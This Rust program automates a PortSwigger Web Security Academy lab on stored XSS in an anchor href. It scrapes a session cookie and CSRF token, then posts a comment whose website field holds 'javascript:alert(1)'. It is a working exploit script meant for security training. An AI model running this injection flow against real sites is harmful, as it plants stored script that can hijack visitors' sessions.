/********************************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 17/11/2023
*
* Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded
*
* Steps: 1. Fetch a post page
*        2. Extract the session cookie and the csrf token to post a comment
*        3. Post a comment with the injected payload in the comment field
*
*********************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0af2008a0401c0468389746300960050.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    print!("{}", "⦗1⦘ Fetching a post page.. ".white());
    io::stdout().flush();

    // fetch a post page
    let post_page = client
        .get(format!("{url}/post?postId=1"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch a post page".red()));

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗2⦘ Extracting the session cookie and the csrf token to post a comment.. ".white(),
    );
    io::stdout().flush();

    // extract session cookie
    let session = extract_session_cookie(post_page.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    // extract the csrf token to post a comment
    let mut csrf = extract_csrf(post_page).expect(&format!(
        "{}",
        "[!] Failed to extract csrf to post a comment".red()
    ));

    println!("{}", "OK".green());
    print!(
        "{}",
        "⦗3⦘ Posting a comment with the injected payload in the comment field.. ".white(),
    );
    io::stdout().flush();

    // payload to call the alert function
    let payload = "javascript:alert(1)";

    // post a comment with the injected payload in the comment field
    client
        .post(format!("{url}/post/comment"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("postId", "1"),
            ("name", "Hacker"),
            ("email", "hack@me.com"),
            ("comment", "you are hacked"),
            ("website", payload),
            ("csrf", &csrf),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to post a comment with the injected payload in the comment field".red()
        ));

    println!("{}", "OK".green());
    println!(
        "{} {}",
        "🗹 The lab should be marked now as".white(),
        "solved".green()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::default())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/*************************************************
* Function to extract csrf from the response body
**************************************************/
fn extract_csrf(res: Response) -> Option<String> {
    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
    {
        Some(csrf.to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}
